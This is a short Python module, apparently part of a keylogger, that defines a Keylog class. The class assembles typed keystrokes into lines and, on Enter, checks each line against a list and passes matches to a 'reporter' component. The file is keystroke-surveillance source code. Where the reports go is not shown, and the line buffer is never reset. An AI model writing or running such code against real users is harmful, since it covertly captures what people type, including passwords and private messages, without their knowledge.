from lib.GlobalManager import gmget


class Keylog:
    line_typed = ""

    def callback(self, event):
        name = event.name

        if len(name) != 1:
            if name == "space":
                name = " "
            elif name == "decimal":
                name = "."
            elif name == "enter":
                name = ""
                if gmget("bwlist").check(self.line_typed):
                    gmget("reporter").report(self.line_typed)

            self.line_typed += name
        else:
            self.line_typed += name